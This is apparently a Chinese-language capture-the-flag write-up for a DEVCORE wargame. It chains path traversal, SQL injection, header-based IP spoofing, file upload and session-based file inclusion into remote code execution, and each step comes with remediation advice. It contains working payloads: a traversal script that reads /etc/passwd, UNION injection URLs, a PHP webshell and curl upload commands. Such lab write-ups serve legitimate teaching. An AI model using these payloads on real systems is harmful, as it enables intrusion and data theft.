# DEVCORE HITCON Wargame


## Rank
![](https://i.imgur.com/7YAgIW7.png)

## 弱點 01：Path Traversal

### CVSS
Score:7.5, CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

### 風險描述
由於 id 參數僅是 base64url 編碼格式而未進行加密保護，因此攻擊者可以輕易竄改參數內容，並且參數在串接進下載檔案路徑時未進行過濾，可以利用「\.\.」字串跳脫當前路徑以下載伺服器上任意位置的檔案內容。

例如：可以讀取 /etc/passwd 檔案內容
http://web.ctf.devcore.tw/image.php?id=Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==

備註：
```php=
"Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==" = base64url("../../../../etc/passwd")
```

### 弱點細節

### 修補建議
過濾檔案路徑不可以出現「\.\.」字串，並且可對 id 參數進行加密保護。

### 心得
* 稍微找一下發現 `image.php` 有著非常可疑的 base64 直接 decode 後發現是檔案名稱直覺就是 path traversal
* 一開始是用別人的 list dump 出資料來看看，不過之後我就跑去打 lol 了 www 所以找到網頁原始碼的是 @txya900619 ，我很抱歉
```python=
import requests
import base64

url = 'http://web.ctf.devcore.tw/image.php'

def checkFilePath():
    f = open('list.txt').readlines()

    for i in f:
        file_path = base64.b64encode(('../../../../../../../../../../../../' + str(i)).replace('\n', '').encode('utf-8')).decode('utf-8')
        params = {
            'id': file_path
        }

        response = requests.get(url, params=params)
        if response.status_code == 200:
            print(i)
            print(response.text)

def interactMode():
    while True:
        file_path = base64.b64encode(('../../../../../../../../../../../../' + input()).encode('utf-8')).decode('utf-8')
        params = {
            'id': file_path
        }

        response = requests.get(url, params=params)
        print(response.status_code)
        print(response.text)


def sessionMode():
    while True:
        file_path = base64.b64encode(('../../../../../../../../../../../../tmp/sess_' + input()).encode('utf-8')).decode('utf-8')
        params = {
            'id': file_path
        }

        response = requests.get(url, params=params)
        print(response.status_code)
        print(response.text)
```
* 之後在 `/proc/self/mounts` 有找到一些關鍵的路徑
```bash=
/dev/sda /etc/hosts ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /etc/resolv.conf ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /etc/hostname ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/local/etc/php/php.ini ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
```
* 我在 `php.ini` 卡滿久的，想說怎麼沒有東西（怒，直接跑去打 lol，之後 @txya900619 找到在 `/usr/share/nginx/frontend` 跟 `/usr/share/nginx/b8ck3nd` 下面

### Final paylaod
```bash=
curl http://web.ctf.devcore.tw/image.php?id=Li4vLi4vLi4vLi4vLi4vdXNyL3NoYXJlL25naW54L2Zyb250ZW5kL2luY2x1ZGUucGhw
```

## 弱點 02：Broken Access Control

### CVSS
Score:7.5, CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

### 風險描述
攻擊者可以透過此弱點取得其他使用者的訂單資料，包括姓名、電子郵件、地址等。

### 弱點細節
雖然訂單資訊頁面存在 sig 參數作為簽名驗證，但由於程式邏輯存在缺陷未妥善處理當 sig 參數為 Array 型態的例外情況，導致可以繞過簽名驗證，同時 id 參數為整數流水號，攻擊者可以輕易列舉出所有訂單資料。

例如：不知道 sig 參數仍可以讀取 id=1 的訂單資料
http://web.ctf.devcore.tw/order.php?id=1&sig[]=

### 修補建議
嚴格檢查 sig 參數必須為 String 型態，並可將 id 參數從流水號改使用難以預測的唯一編號字串，例如：UUID。

### 心得
* 這一個 flag 是 @txya900619 拿到的，不過不是預期解拿到的，是因為試了 SQL injection 拿到的 flag，因為放在第一個 column 裡面 www，所以直接在 `print.php` 的 id 的部分進行注入就可以拿到 flag 了
```php=
$res = $pdo->query("
    SELECT *
    FROM orders
    WHERE sig_hash = '$sig_hash' AND id = $id
    LIMIT 1
", PDO::FETCH_ASSOC);

try {
    $order = $res->fetch();
} catch (Error $e) {
    $order = [];
}
```

### Final payload
```bash=
http://web.ctf.devcore.tw/print.php?id=2412%20or%201=1&sig=F6nv0pcPYH7flOTWQxzSu60GzQUDLqDMpIlOhsHxZ4DH2XI7iMAN8sk7LAbBkGCV
```

## 弱點 03：SQL Injection
### CVSS
Score:9.1, CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H

### 風險描述
攻擊者可以透過此弱點讀取 web 資料庫內的所有資料，包括訂單資料等。

### 弱點細節
由於 id 參數未作任何過濾而直接被帶入 SQL 字串，導致攻擊者可以注入任意的 SQL 語法，讀取資料庫內的所有資料。

例如：可以利用 version() 讀取資料庫版本資訊
http://web.ctf.devcore.tw/print.php?id=0+union+select+1,2,3,4,5,6,7,version(),9&sig=

### 修補建議
改用 Prepared Statement 的方式綁定參數，或利用 PDO::quote 等函式將特殊字元進行跳脫處理。

### 心得
* 就如同之前說的，`print.php` 的 id 是注入點，本來想要用 sqlmap 直接打，不過他會生成 pdf 檔案，所以回顯應該是不足以 sqlmap 判斷的，所以只能手工，手工到最後發現 flag 在 backend_users 的 description 裡面

### Final payload
```bash=
http://web.ctf.devcore.tw/print.php?id=-1%20union%20select%201,(select%20description%20from%20backend_users%20limit%200,1),3,4,5,6,7,8,9%23
```

## 弱點 04：Use of Less Trusted Source

### CVSS
Score:5.3, CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

### 風險描述
攻擊者可以透過偽造 Client-IP、X-Fowraded-For 等 HTTP Header，假造攻擊者的來源 IP 位址以欺騙網頁應用程式繞過 IP 位址檢查，並可存取受限制的後台介面。

### 弱點細節
管理後台會限制特定來源 IP 位址才可存取，但採用了來自客戶端提供的 Client-IP、X-Fowraded-For 等 HTTP Header 作為 IP 位址的資訊來源，因此攻擊者可以在 HTTP 請求封包中添加上述 Header 以此繞過該限制存取管理後台，若攻擊者獲取管理員帳號密碼，就能進入管理後台造成更大的危害。

例如：發送以下 HTTP 請求封包即可看見後台登入介面
```=
GET /b8ck3nd/login.php HTTP/1.1
Host: sdfnu837-34mf3.web.ctf.devcore.tw
X-Forwarded-For: 127.0.0.1
```

### 修補建議
避免僅使用 HTTP Request Header 作為 IP 位址來源的依據。
參考資料：https://devco.re/blog/2014/06/19/client-ip-detection/

### 心得
* 使用者帳密是用 SQL injection 的地方 dump 出資料的，之後就可以登入了，由於我有常駐一個 extension 是 `x-forwarded-for: 127.0.0.1` 所以直接就進去了，看了 source code 才發現是有驗證
* 登入進去之後就可以拿到 flag 了
```php=
session_start_once();

if (!in_array(get_client_ip(), ['127.0.0.1', '172.18.11.89'], true)) {
    header('Location: /');
    exit();
}

if (!isset($_SESSION['user_id'])) {
    if (!endsWith($_SERVER['SCRIPT_FILENAME'], 'login.php')) {
        header('Location: /b8ck3nd/login.php');
        exit();
    }
}
```


## 弱點 05：Unrestricted File Upload
### CVSS
Score:8.8, CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### 風險描述
攻擊者可以將任意檔案內容上傳至任意的路徑位置，存在有機會造成 Remote Code Exeuction 的風險。

### 弱點細節
上傳圖片功能並未限制可上傳的檔案格式，並且未限制 rename、folder 參數，因此可以透過「..」字串跳脫當前路徑，將檔案上傳至任意位置，若 web 路徑下存在可寫資料夾，或存在可覆蓋的可執行檔案，攻擊者有機會上傳 webshell 執行任意指令取得系統控制權。

例如：以下參數可將檔案上傳至 /tmp/pwn.php
```bash=
POST http://web.ctf.devcore.tw/b8ck3nd/upload.php
rename=../../../../../../../tmp/pwn.php
file={檔案二進位內容}
```

### 修補建議
限制可上傳檔案的副檔名、檔案類型，並建議強制將檔案重新命名後移動至指定資料夾之中。

### 心得
* 其實很早就看到這個，但因為這需要登陸才能使用，所以其實 flag 很快就出來了，出現 flag 的條件似乎是最後檔案存的位置只要跳脫原先的 images/ 就可以了
* 不過不一定能寫入，這個是最後一題的坑

### Final payload
```bash=
curl http://web.ctf.devcore.tw/b8ck3nd/upload.php -F file=@./shell.php -F rename='../../cc.php' -b "PHPSESSID=flag" -H "x-forwarded-for: 127.0.0.1"
```

## 弱點 06：Local File Inclusion

### CVSS
Score:7.5, CCVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H

### 風險描述
攻擊者可以利用「require_once」函式透過「\.\.」路徑跳脫字串跳脫當前目錄，引入任意的 .php 檔案，若攻擊者可以控制引入檔案的內容，就有機會執行任意系統指令。

### 弱點細節
在 `/usr/share/nginx/frontend/include.php` 檔案之中，由於未過濾 `$_SESSION['lang']` 的變數就直接代入 `require_once` 函式的檔案路徑之中，導致若攻擊者可以控制 session 變數內容，即可引入並執行任意位置的 .php 檔案，搭配「弱點 05：Unrestricted File Upload」控制 session 檔案，即可達成執行任意系統指令。

參考弱點程式碼：
```php=
require_once('langs/' . $_SESSION['lang'] . '.php');
```

### 修補建議
session 參數並非完全可信任，建議使用 session 變數進行危險操作前，仍應檢查是否存在「\.\.」等目錄跳脫字串。

### 心得
* 想了一段時間，一直卡在寫入檔案的問題，因為只能寫入 `images` 跟 `tmp` 裡面
* 之後看到關鍵的 php code
```php=
require_once('langs/' . $_SESSION['lang'] . '.php');
```
* 有趣的地方來了，是可以寫入 tmp 的，所以自然可以寫入自己的 cookie session 裡面，如果看一下裡面的架構長這樣
```bash=
lang|s:5:"zh-tw";user_id|s:1:"1";
```
* 所以我只要改 lang 對應的 string 就可以了
```bash=
lang|s:len(your_upload_file_path):"your_upload_file_path";user_id|s:1:"1";
```
* 之後上傳一下 webshell 就可以拿到 shell 了
```php=
<?php system($_GET["cmd"]); ?>
```

### Final payload
* Upload webshell
```bash=
curl http://web.ctf.devcore.tw/b8ck3nd/upload.php -F 'file=@"./webshell.php"' -F "rename=entroy.php" -F "folder=../../../../../../usr/share/nginx/images" --cookie "PHPSESSID=trh3kajnbnbr562pnhkdk3nr8n" -H "x-forwarded-for: 127.0.0.1" -v 3
```
* Upload phpsessionid
```bash=
curl http://web.ctf.devcore.tw/b8ck3nd/upload.php -F 'file=@"./session"' -F "rename=sess_trh3kajnbnbr562pnhkdk3nr8n" -F "folder=../../../../../../tmp" --cookie "PHPSESSID=trh3kajnbnbr562pnhkdk3nr8n" -H "x-forwarded-for: 127.0.0.1" -v 3
```
* Get flag
```bash=
curl http://web.ctf.devcore.tw/b8ck3nd/index.php?cmd=/readflag
```

## 心得
* 我卡在奇怪的地方有點久（我就爛，只能說最早解完的 splitline 真的很強啊！！！這次的 web 滲透測試真的做得滿好的，有學到東西的感覺，雖然都知道這些漏洞，不過當要把他們串在一起的時候會卡住，可想而知在串 Exchange server 的 RCE 有多難了。體驗了一個很接近 real world 的 wargame，至少比起去年的我一題都解不出來要好很多了（www，感謝出題者以及 @txya900619 的幫助 --- @entroy 
* 還蠻好玩的，很多題都是蠻意外的解法，尤其是最後一題我還真的是沒有想到可以這樣串，總結來說，解完這次的題目真的是學到蠻多的。


